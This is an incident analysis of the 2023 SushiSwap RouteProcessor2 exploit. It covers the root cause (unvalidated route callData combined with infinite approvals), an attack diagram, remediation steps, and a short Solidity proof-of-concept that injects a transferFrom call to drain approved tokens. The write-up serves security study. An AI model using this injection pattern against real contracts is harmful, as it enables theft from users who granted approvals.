# SushiSwap RouterProcessor2 — Infinite Approval Exploit Analysis

| Field | Details |
|------|------|
| **Date** | 2023-04-28 |
| **Protocol** | SushiSwap |
| **Chain** | Ethereum (and multiple chains) |
| **Loss** | ~3.3M USD |
| **Attacker** | Multiple attackers (including MEV bots) |
| **Attack Tx** | Multiple Ethereum transactions |
| **Vulnerable Contract** | SushiSwap RouteProcessor2 |
| **Root Cause** | RouteProcessor2 allowed execution of arbitrary callData, enabling theft of tokens from users who had granted infinite approvals |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/Sushi_Router_exp.sol) |

---
## 1. Vulnerability Overview

SushiSwap's RouteProcessor2 contract includes functionality to pass arbitrary callData to external contracts in order to handle complex swap routes. This functionality was insufficiently restricted, allowing an attacker to drain assets from users who had approved tokens to RouteProcessor2. This attack follows the same pattern as Dexible (2023-02-17) and Revert Finance (2023-02-27).

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable RouteProcessor2
// Arbitrary callData execution inside processRoute
function processRoute(
    address tokenIn,
    uint256 amountIn,
    address tokenOut,
    uint256 amountOutMin,
    address to,
    bytes memory route
) external payable returns (uint256 amountOut) {
    // Calls arbitrary contracts included in route
    // ❌ Executes route data without validation
    (bool success,) = routerAddress.call(routeData);
    // Attacker can set routeData = transferFrom(victim, attacker, amount)
}

// ✅ Fix: Only allow whitelisted routers
function processRoute(...) external payable {
    require(allowedRouters[routerAddress], "Router not allowed");
    // Block dangerous function selectors from callData
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: RouteProcessor2 could execute arbitrary callData, enabling theft of tokens from users with infinite approvals
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Scan for addresses that have granted infinite approvals to RouteProcessor2
  │       (many users grant infinite approvals for convenience)
  │
  ├─2─▶ SushiSwap.processRoute({
  │         tokenIn: victim_token,
  │         route: [malicious_callData],  // transferFrom(victim, attacker, amount)
  │     })
  │
  ├─3─▶ RouteProcessor2 executes transferFrom on victim's token contract
  │       Processed using victim's existing approval
  │
  └─4─▶ Repeated across multiple victims → ~3.3M USD drained
          (MEV bots played whitehat role, rescuing some funds)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function exploit(address victim, address token, uint256 amount) external {
    // Steal victim's tokens via RouteProcessor2
    // Inject malicious transferFrom into route data
    bytes memory maliciousRoute = abi.encodePacked(
        /* route header */,
        token,          // target token contract
        abi.encodeWithSelector(
            IERC20.transferFrom.selector,
            victim,         // victim
            address(this),  // attacker
            amount
        )
    );

    IRouteProcessor(routeProcessor).processRoute(
        token, 0, token, 0, address(this), maliciousRoute
    );
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arbitrary External Call + Approval Abuse |
| **Attack Vector** | Unvalidated route callData + infinite approvals |
| **Impact Scope** | All users who approved RouteProcessor2 |
| **DASP Classification** | Access Control |
| **CWE** | CWE-284: Improper Access Control |

## 6. Remediation Recommendations

1. **Allowed Router Whitelist**: Strictly limit the set of contracts that can be executed.
2. **Route callData Validation**: Block dangerous selectors such as `transferFrom`.
3. **Exact Amounts Instead of Infinite Approvals**: Guide users through the UI to approve only the exact required amount.

## 7. Lessons Learned

- Dexible (02-17), Revert Finance (02-27), and SushiSwap (04-28) all share the same pattern — recurring within the same period.
- Allowing arbitrary callData execution in router/aggregator contracts is an extremely dangerous design choice.
- SushiSwap responded swiftly after the vulnerability was disclosed, and some MEV bots contributed to protecting users.